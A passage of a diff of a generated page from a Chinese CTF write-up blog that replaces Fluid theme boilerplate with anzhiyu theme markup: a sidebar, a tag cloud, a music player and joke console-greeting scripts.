class="toc-number">1.0.1.</span> <span class="toc-text">references:</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/08/NSS%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-BCACTF-2024-Static/" title="NSS刷题记录 [BCACTF 2024]Static">NSS刷题记录 [BCACTF 2024]Static</a><time datetime="2026-05-08T11:41:59.000Z" title="发表于 2026-05-08 19:41:59">2026-05-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/14/polarCTFweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%AE%80%E5%8D%95-02/" title="polarCTFweb刷题记录(简单)02">polarCTFweb刷题记录(简单)02</a><time datetime="2025-12-14T13:49:17.000Z" title="发表于 2025-12-14 21:49:17">2025-12-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/14/polarCTFweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%AE%80%E5%8D%95/" title="polarCTFweb刷题记录(简单)">polarCTFweb刷题记录(简单)</a><time datetime="2025-12-14T13:43:29.000Z" title="发表于 2025-12-14 21:43:29">2025-12-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" title="记录一种文件上传的绕过方法">记录一种文件上传的绕过方法</a><time datetime="2025-12-11T11:14:13.000Z" title="发表于 2025-12-11 19:14:13">2025-12-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/10/ISITDTU-2019-EasyPHP/" title="[ISITDTU 2019]EasyPHP">[ISITDTU 2019]EasyPHP</a><time datetime="2025-11-10T10:41:06.000Z" title="发表于 2025-11-10 18:41:06">2025-11-10</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2026 By <a class="footer-bar-link" href="/" title="everythingis-ok" target="_blank">everythingis-ok</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">7</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://hexo.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/00%E6%88%AA%E6%96%AD/" style="font-size: 0.88rem;">00截断<sup>1</sup></a><a href="/tags/0%E5%AE%BD%E9%9A%90%E5%86%99/" style="font-size: 0.88rem;">0宽隐写<sup>1</sup></a><a href="/tags/CTFhub/" style="font-size: 0.88rem;">CTFhub<sup>1</sup></a><a href="/tags/Ctfhub/" style="font-size: 0.88rem;">Ctfhub<sup>1</sup></a><a href="/tags/LSB%E9%9A%90%E5%86%99/" style="font-size: 0.88rem;">LSB隐写<sup>1</sup></a><a href="/tags/Linux%E5%91%BD%E4%BB%A4/" style="font-size: 0.88rem;">Linux命令<sup>1</sup></a><a href="/tags/MIME%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">MIME绕过<sup>1</sup></a><a href="/tags/NSSCTF/" style="font-size: 0.88rem;">NSSCTF<sup>4</sup></a><a href="/tags/NTFS%E6%95%B0%E6%8D%AE%E9%9A%90%E5%86%99/" style="font-size: 0.88rem;">NTFS数据隐写<sup>1</sup></a><a href="/tags/NewStarCTF2024/" style="font-size: 0.88rem;">NewStarCTF2024<sup>1</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>1</sup></a><a href="/tags/RCE%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">RCE绕过<sup>1</sup></a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">SQL注入<sup>2</sup></a><a href="/tags/SSTI/" style="font-size: 0.88rem;">SSTI<sup>1</sup></a><a href="/tags/TGCTF/" style="font-size: 0.88rem;">TGCTF<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 0.88rem;">XXE<sup>1</sup></a><a href="/tags/create-function-%E5%87%BD%E6%95%B0/" style="font-size: 0.88rem;">create_function()函数<sup>1</sup></a><a href="/tags/handel%E8%AF%AD%E5%8F%A5/" style="font-size: 0.88rem;">handel语句<sup>1</sup></a><a href="/tags/md5%E7%A2%B0%E6%92%9E/" style="font-size: 0.88rem;">md5碰撞<sup>1</sup></a><a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">php代码审计<sup>1</sup></a><a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">php反序列化<sup>1</sup></a><a href="/tags/polarctf/" style="font-size: 0.88rem;">polarctf<sup>1</sup></a><a href="/tags/pop%E9%93%BE%E6%9E%84%E9%80%A0/" style="font-size: 0.88rem;">pop链构造<sup>1</sup></a><a href="/tags/python%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size: 0.88rem;">python反编译<sup>1</sup></a><a href="/tags/rce4/" style="font-size: 0.88rem;">rce4<sup>1</sup></a><a href="/tags/session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.88rem;">session文件包含<sup>1</sup></a><a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" style="font-size: 0.88rem;">信息泄露<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81/" style="font-size: 0.88rem;">前端验证<sup>1</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size: 0.88rem;">博客搭建<sup>1</sup></a><a href="/tags/%E5%8E%8B%E7%BC%A9%E5%8C%85%E4%BF%AE%E5%A4%8D/" style="font-size: 0.88rem;">压缩包修复<sup>1</sup></a><a href="/tags/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" style="font-size: 0.88rem;">图片隐写<sup>1</sup></a><a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">堆叠注入<sup>1</sup></a><a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">报错注入<sup>1</sup></a><a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">提权<sup>1</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.88rem;">文件上传<sup>3</sup></a><a href="/tags/%E6%9B%B4%E6%94%B9%E8%A1%A8%E5%90%8D/" style="font-size: 0.88rem;">更改表名<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 0.88rem;">编码<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/" style="font-size: 0.88rem;">编码解码<sup>1</sup></a><a href="/tags/%E9%9A%90%E5%86%99/" style="font-size: 0.88rem;">隐写<sup>1</sup></a><a href="/tags/%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5/" style="font-size: 0.88rem;">预编译语句<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.7.1",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 everythingis-ok 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://cdn.cbd.int/qrcodejs@1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
   
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>[ISITDTU 2019]EasyPHP</div>
-      <div>http://example.com/2025/11/10/ISITDTU-2019-EasyPHP/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>everythingis-ok</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2025年11月10日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-cc-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2025/12/11/%E8%AE%B0%E5%BD%95%E4%B8%80%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" title="记录一种文件上传的绕过方法">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">记录一种文件上传的绕过方法</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2025/11/07/NSSRound-7/" title="NSSRound#7">
-                        <span class="hidden-mobile">NSSRound#7</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>目录</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
       }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
     }
+  }
 
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
+  typeof typed === 'object' && typed.destroy()
 
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
 
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
 
-  <script>Fluid.plugins.codeWidget();</script>
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
 
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
 
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
+  typeof panguInit === 'function' && panguInit()
 
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
 
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
 
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
 
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
 
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-</body>
-</html>
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
